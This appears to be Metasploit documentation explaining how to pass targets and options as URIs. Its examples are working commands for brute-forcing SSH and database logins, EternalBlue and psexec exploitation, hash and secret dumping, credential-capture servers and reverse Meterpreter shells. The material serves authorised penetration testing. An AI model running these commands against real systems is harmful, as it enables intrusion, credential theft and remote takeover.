- [Using Metasploit](#getting-started)
  * [Getting started](#overview)
  * [Overview](#overview)
    + [URI support for RHOSTS](#uri-support-for-rhosts)
  * [HTTP Support](#http-support)
    + [HTTP Examples](#http-examples)
    + [HTTP Debugging](#http-debugging)
    + [HTTP Credentials](#http-credentials)
  * [SMB Support](#smb-support)
    + [SMB Enumeration](#smb-enumeration)
    + [SMB Server](#smb-servef)
    + [SMB ms17_010](#smb-ms17-010)
    + [SMB psexec](#smb-psexec)
    + [SMB Dumping](#smb-dumping)
    + [SMB Files](#smb-files)
  * [SSH Workflows](#ssh-workflows)
    + [SSH Enumeration](#ssh-enumeration)
    + [SSH Bruteforce](#ssh-bruteforce)
    + [SSH Login](#ssh-login)
    + [SSH Pivoting](#ssh-pivoting)
  * [MySQL](#mysql)
    + [MySQL Enumeration](#mysql-enumeration)
    + [MySQL Login / Bruteforce](#mysql-login---bruteforce)
    + [MySQL Dumping](#mysql-dumping)
    + [MySQL Querying](#mysql-querying)
  * [PostgreSQL](#postgresql)
    + [PostgreSQL Enumeration](#postgresql-enumeration)
    + [PostgreSQL Login / Bruteforce](#postgresql-login---bruteforce)
    + [PostgreSQL Capture Server](#postgresql-capture-server)
    + [PostgreSQL Dumping](#postgresql-dumping)
    + [PostgreSQL Querying](#postgresql-querying)
    + [PostgreSQL Reverse Shell](#postgresql-reverse-shell)
  * [Upgrading shells to Meterpreter](#upgrading-shells-to-meterpreter)
  * [Post Modules](#post-modules)

## Getting started

Depending on your skill level - if you have no experience with Metasploit, the following resources may be a better starting point:

* https://tryhackme.com/room/rpmetasploit
* http://www.offensive-security.com/metasploit-unleashed/Main_Page
* https://metasploit.help.rapid7.com/docs/
* https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/
* https://github.com/rapid7/metasploitable3

## Overview

Traditional usage of Metasploit involves loading a module, and setting multiple options: 

```
use exploit/linux/postgres/postgres_payload
set username administrator
set password pass
set rhost 192.168.123.6
set rport 5432
set database postgres
set lhost 192.168.123.1
set lport 5000
run
```

This document describes a modern approach to setting multiple options in a command. This workflow will not only make it easier to use `reverse-i-search` with `CTRL+R` in Metasploit's console, but it will also make it easier to share cheat sheets amongst pentesters.

### URI support for RHOSTS

Metasploit now supports the use of [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier) strings as arguments to the run command to specify RHOST values and option values at once:

```
use exploit/linux/postgres/postgres_payload
run postgres://administrator:pass@192.168.123.6 lhost=192.168.123.1 lport=5000
```

The following protocols are currently supported, and described in more detail below:

- cidr - Can be combined with other protocols to specify address subnet mask length
- file - Load a series of RHOST values separated by newlines from a file. This file can also include URI strings
- http
- https
- mysql
- postgres
- smb
- ssh

To preserve whitespace, regardless of the protocol, use quotes:

```
use auxiliary/admin/postgres/postgres_sql
run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()'
```

In some scenarios it may be too troublesome to escape quotes within a password. In this scenario it possible to still set the password option manually and use the URI argument without a password specified, the module will gracefully fallback to using the manually set password:

```
set password !@£$%^&*()"'
run smb://user@192.168.123.13
```

You can also specify multiple RHOST arguments, as well as provide additionally inlined options:

```
use scanner/smb/smb_enumshares
run smb://test:test@192.168.1.223 smb://user:password@192.168.1.223 smb://test:test@127.0.0.1 verbose=true 
```

## HTTP Support

### HTTP Examples

Auxiliary modules:

```
use auxiliary/scanner/http/title
run http://example.com https://example.com https://foo.example.com/bar
```

Specifying credentials and payload information:

```
use exploit/unix/http/cacti_filter_sqli_rce
run http://admin:pass@application.local/cacti/ lhost=tun0 lport=4444
run 'http://admin:pass with spaces@application.local/cacti/' lhost=tun0 lport=4444
```

Specifying alternative ports:

```
run http://192.168.123.6:9001
```

### HTTP Debugging

You can log all HTTP requests and responses to the Metasploit console with the `HttpTrace` option, as well as enable additional verbose logging:

```
use auxiliary/scanner/http/title
run http://example.com HttpTrace=true verbose=true
```

To send all HTTP requests through a proxy, i.e. through Burp Suite:

```
use auxiliary/scanner/http/title
run http://example.com HttpTrace=true verbose=true proxies=HTTP:127.0.0.1:8080
```

### HTTP Credentials

If the module has no `username`/`password` options, for instance to log into an admin portal of a web application etc, then the credentials supplied via a HTTP URI will set the `HttpUsername`/`HttpPassword` options for [HTTP Basic access Authentication](https://en.wikipedia.org/wiki/Basic_access_authentication) purposes.

For instance, in the following module the `username`/`password` options will be set whilst the `HttpUsername`/`HttpPassword` options will not:

```
use exploit/unix/http/cacti_filter_sqli_rce

Module options (exploit/unix/http/cacti_filter_sqli_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   ... Omitted ...
*  PASSWORD   admin            no        Password to login with
   TARGETURI  /cacti/          yes       The URI of Cacti        
*  USERNAME   user             yes       User to login with      
   ... Omitted ...

check http://admin:user@application.local/cacti/

USERNAME and PASSWORD will be set to 'admin' and 'user'
```

For the following module, as are no `USERNAME`/`PASSWORD` options, the `HttpUsername`/`HttpPassword` options will be chosen instead for [HTTP Basic access Authentication](https://en.wikipedia.org/wiki/Basic_access_authentication) purposes

```
use exploit/multi/http/tomcat_mgr_deploy
run http://admin:admin@192.168.123.6:8888 HttpTrace=true verbose=true lhost=192.168.123.1
```

Note that the `HttpUsername`/`HttpPassword` may not be present in the `options` output, but can be found in the `advanced` module options:

```
use auxiliary/scanner/http/title
advanced

Module advanced options (auxiliary/scanner/http/title):

   Name                  Current Setting                                    Required  Description
   ----                  ---------------                                    --------  -----------
   DOMAIN                WORKSTATION                                        yes       The domain to use for Windows authentication
   DigestAuthIIS         true                                               no        Conform to IIS, should work for most servers. Only set to false for non-IIS servers
   FingerprintCheck      true                                               no        Conduct a pre-exploit fingerprint verification
   HttpClientTimeout                                                        no        HTTP connection and receive timeout
*  HttpPassword                                                             no        The HTTP password to specify for authentication
   HttpRawHeaders                                                           no        Path to ERB-templatized raw headers to append to existing headers
   HttpTrace             false                                              no        Show the raw HTTP requests and responses
   HttpTraceColors       red/blu                                            no        HTTP request and response colors for HttpTrace (unset to disable)
   HttpTraceHeadersOnly  false                                              no        Show HTTP headers only in HttpTrace
*  HttpUsername                                                             no        The HTTP username to specify for authentication
   SSLVersion            Auto                                               yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accept
                                                                                      ed: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   ShowProgress          true                                               yes       Display progress messages during a scan
   ShowProgressPercent   10                                                 yes       The interval in percent that progress should be shown
   UserAgent             Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1  no        The User-Agent header to use for all requests
                         )
   VERBOSE               false                                              no        Enable detailed status messages
   WORKSPACE                                                                no        Specify the workspace for this module
```

## SMB Support

### SMB Enumeration

Enumerate SMB version:

```
use auxiliary/scanner/smb/smb_version
run smb://10.10.10.161
```

Enumerate shares:

```
use auxiliary/scanner/smb/smb_enumshares
run smb://10.10.10.161
run smb://user:pass@10.10.10.161
run 'smb://domain;user with spaces:pass@192.168.123.4' SMB::AlwaysEncrypt=false SMB::ProtocolVersion=1
```

Enumerate shares and show all files recursively:

```
use auxiliary/scanner/smb/smb_enumshares
run 'smb://user:pass with a space@10.10.10.161' showfiles=true spidershares=true
```

Enumerate users:

```
use auxiliary/scanner/smb/smb_enumusers
run smb://user:p4$$w0rd@192.168.123.13
```

[Enumerate gpp files](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/smb/smb_enum_gpp.md) in a SMB share:

```
use auxiliary/scanner/smb/smb_enum_gpp
run smb://192.168.123.13/share_name verbose=true store=true
run smb://user:p4$$w0rd@192.168.123.13/share_name verbose=true store=true
```

### SMB Server

Create a mock SMB server which accepts credentials before returning `NT_STATUS_LOGON_FAILURE`. These hashes can then be cracked later:

```
use auxiliary/server/capture/smb
run
```

### SMB ms17_010

Checking for exploitability:

```
use auxiliary/scanner/smb/smb_ms17_010
check 10.10.10.23
check 10.10.10.0/24
check smb://user:pass@10.10.10.1/
check smb://domain;user:pass@10.10.10.1/
check cidr:/24:smb://user:pass@10.10.10.0 threads=32
```

As of 2021, Metasploit supports a single exploit module for which has the capability to target Windows 7, Windows 8.1, Windows 2012 R2, and Windows 10, full details within the [Metasploit Wrapup](https://www.rapid7.com/blog/post/2021/07/16/metasploit-wrap-up-121/):

```
use exploit/windows/smb/ms17_010_eternalblue
run 10.10.10.23 lhost=192.168.123.1
run 10.10.10.0/24 lhost=192.168.123.1 lport=5000
run smb://user:pass@10.10.10.1/ lhost=192.168.123.1 
run smb://domain;user:pass@10.10.10.1/ lhost=192.168.123.1
```

### SMB psexec

Running psexec against a remote host with credentials:

```
use exploit/windows/smb/psexec
run smb://user:pass8@192.168.123.13 lhost=192.168.123.1 lport=5000
```

Running psexec with NT:LM hashes:

```
use exploit/windows/smb/psexec
run smb://Administrator:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6@10.10.10.161 lhost=10.10.14.13 lport=5000
```

### SMB Dumping

Dumping secrets with credentials:

```
use auxiliary/gather/windows_secrets_dump
run smb://user:pass@192.168.123.6
```

Dumping secrets with NT:LM hashes

```
use auxiliary/gather/windows_secrets_dump
run smb://Administrator:aad3b435b51404eeaad3b435b51404ee:15feae27e637cb98ffacdf0a840eeb4b@192.168.123.1
```

### SMB Files

Download a file:

```
use auxiliary/admin/smb/download_file
run smb://a:p4$$w0rd@192.168.123.13/my_share/helloworld.txt
```

Upload a file:

```
use auxiliary/admin/smb/upload_file
echo "my file" > local_file.txt
run smb://a:p4$$w0rd@192.168.123.13/my_share/remote_file.txt lpath=./local_file.txt
```

## SSH Workflows

### SSH Enumeration

Enumerate SSH version:

```
use auxiliary/scanner/ssh/ssh_version
run ssh://127.0.0.1
```

### SSH Bruteforce

Brute-force host with known user and password list:

```
use scanner/ssh/ssh_login
run ssh://known_user@192.168.222.1 threads=50 pass_file=./rockyou.txt
```

Brute-force credentials:

```
use scanner/ssh/ssh_login
run ssh://192.168.222.1 threads=50 user_file=./users.txt pass_file=./rockyou.txt
```

Brute-force credentials in a subnet:

```
use scanner/ssh/ssh_login
run cidr:/24:ssh://user:pass@192.168.222.0 threads=50
run cidr:/24:ssh://user@192.168.222.0 threads=50 pass_file=./rockyou.txt
```

### SSH Login

If you have valid SSH credentials the `ssh_login` module will open a Metasploit session for you:

```
use scanner/ssh/ssh_login
run ssh://user:pass@172.18.102.20
```

Re-using SSH credentials in a subnet:

```
use scanner/ssh/ssh_login
run cidr:/24:ssh://user:pass@192.168.222.0 threads=50
```

Using an alternative port:

```
use scanner/ssh/ssh_login
run ssh://user:pass@192.168.123.6:2222
```

### SSH Pivoting

Like Meterpreter, it is possible to [port forward through a Metasploit SSH session](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login.md#session-capabilities):

```
route add 172.18.103.0/24 ssh_session_id
```

To a route for the most recently opened Meterpreter session:

```
route add 172.18.103.0/24 -1
```

## MySQL

For instance, when running a MySQL target:

```
docker run -it --rm -e MYSQL_ROOT_PASSWORD=' a b c p4$$w0rd' -p 3306:3306 mariadb:latest
```

### MySQL Enumeration

Enumerate version:

```
use auxiliary/scanner/mysql/mysql_version
run mysql://127.0.0.1
```

### MySQL Login / Bruteforce

If you have MySQL credentials to validate:

```
use auxiliary/scanner/mysql/mysql_login
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
```

Re-using MySQL credentials in a subnet:

```
use auxiliary/scanner/mysql/mysql_login
run cidr:/24:mysql://user:pass@192.168.222.0 threads=50
```

Using an alternative port:

```
use auxiliary/scanner/mysql/mysql_login
run mysql://user:pass@192.168.123.6:2222
```

Brute-force host with known user and password list:

```
use auxiliary/scanner/mysql/mysql_login
run mysql://known_user@192.168.222.1 threads=50 pass_file=./rockyou.txt
```

Brute-force credentials:

```
use auxiliary/scanner/mysql/mysql_login
run mysql://192.168.222.1 threads=50 user_file=./users.txt pass_file=./rockyou.txt
```

Brute-force credentials in a subnet:

```
use auxiliary/scanner/mysql/mysql_login
run cidr:/24:mysql://user:pass@192.168.222.0 threads=50
run cidr:/24:mysql://user@192.168.222.0 threads=50 pass_file=./rockyou.txt
```

### MySQL Dumping

User and hash dump:

```
use auxiliary/scanner/mysql/mysql_hashdump
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
```

Schema dump:

```
use auxiliary/scanner/mysql/mysql_schemadump
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
```

### MySQL Querying

Execute raw SQL:

```
use admin/mysql/mysql_sql
run 'mysql://root: a b c p4$$w0rd@127.0.0.1' sql='select version()'
```

## PostgreSQL

For instance, when running a PostgreSQL instance:

```
docker run --rm -p 5432:5432 -e POSTGRES_PASSWORD=password postgres:13.1-alpine
```

### PostgreSQL Enumeration

Enumerate version:

```
use auxiliary/scanner/postgres/postgres_version
run postgres://192.168.123.13
run postgres://postgres:password@192.168.123.13
```

### PostgreSQL Login / Bruteforce

If you have PostgreSQL credentials to validate:

```
use auxiliary/scanner/postgres/postgres_login
run 'postgres://root: a b c p4$$w0rd@127.0.0.1'
```

Re-using PostgreSQL credentials in a subnet:

```
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:myspostgresl://user:pass@192.168.222.0 threads=50
```

Using an alternative port:

```
use auxiliary/scanner/postgres/postgres_login
run postgres://user:pass@192.168.123.6:2222
```

Brute-force host with known user and password list:

```
use auxiliary/scanner/postgres/postgres_login
run postgres://known_user@192.168.222.1 threads=50 pass_file=./rockyou.txt
```

Brute-force credentials:

```
use auxiliary/scanner/postgres/postgres_login
run postgres://192.168.222.1 threads=50 user_file=./users.txt pass_file=./rockyou.txt
```

Brute-force credentials in a subnet:

```
use auxiliary/scanner/postgres/postgres_login
run cidr:/24:postgres://user:pass@192.168.222.0 threads=50
run cidr:/24:postgres://user@192.168.222.0 threads=50 pass_file=./rockyou.txt
```

### PostgreSQL Capture Server

Captures and log PostgreSQL credentials:

```
use auxiliary/server/capture/postgresql
run
```

For example, if a client connects with:

```
psql postgres://postgres:mysecretpassword@localhost:5432
```

Metasploit's output will be:

```
msf6 auxiliary(server/capture/postgresql) > 
[*] Started service listener on 0.0.0.0:5432 
[*] Server started.
[+] PostgreSQL LOGIN 127.0.0.1:60406 postgres / mysecretpassword / postgres
```

### PostgreSQL Dumping

User and hash dump:

```
use auxiliary/scanner/postgres/postgres_hashdump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13/database_name
```

Schema dump:

```
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:password@192.168.123.13
run postgres://postgres:password@192.168.123.13 ignored_databases=template1,template0,postgres
```

### PostgreSQL Querying

```
use auxiliary/admin/postgres/postgres_sql
run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()'
```

### PostgreSQL Reverse Shell


```
use exploit/linux/postgres/postgres_payload
run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\ x86_64'
```

## Upgrading shells to Meterpreter

To upgrade a specific session to Meterpreter:

```
sessions -u 3
```

To upgrade the most recently opened session to Meterpreter using the `sessions` command:

```
sessions -u -1
```

Or run the `shell_to_meterpreter` module manually:

```
use multi/manage/shell_to_meterpreter
run session=-1
run session=-1 win_transfer=POWERSHELL
run session=-1 win_transfer=VBS
```

## Post Modules

Providing inline options also works for post modules:

```
use auxiliary/windows/gather/credentials/gpp
run session=-1
```
